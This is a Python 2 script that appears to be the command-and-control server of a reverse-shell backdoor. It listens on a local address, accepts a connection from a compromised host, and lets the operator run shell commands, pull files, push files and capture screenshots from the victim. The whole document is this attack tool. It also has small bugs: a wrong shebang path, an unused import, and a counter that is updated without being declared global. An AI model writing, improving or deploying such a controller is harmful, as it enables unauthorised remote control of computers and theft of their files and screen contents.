#!/user/bin/python

from email.mime import image
import socket, json, base64

count = 1

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = raw_input("* Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                dl = reliable_recv()
                file.write(base64.b64decode(dl))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as file:
                    reliable_send(base64.b64encode(file.read()))
            except:
                failed = "Failed to upload"
                reliable_send(base64.b64encode(failed))
        elif command[:10] == "screenshot":
            with open("screenshot%d" % count, "wb") as ss:
                image = reliable_recv()
                image_decode = base64.b64decode(image)
                if image_decode[:4] == "[!!}":
                    print(image_decode)
                else:
                    ss.write(image_decode)
                    count += 1
        else:
            result = reliable_recv()
            print(result)

# Create Server
def server():
    global sock
    global ip
    global target
    # Create TCP IPv4 socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # IP and port to bind to
    sock.bind(("192.168.0.21", 54321))
    # Set number of listerners
    sock.listen(5)
    print("[+] Listening for inbound connections.")

    target, ip = sock.accept()
    print("[+] Connection established from: %s" % str(ip))

server()
shell()
sock.close()
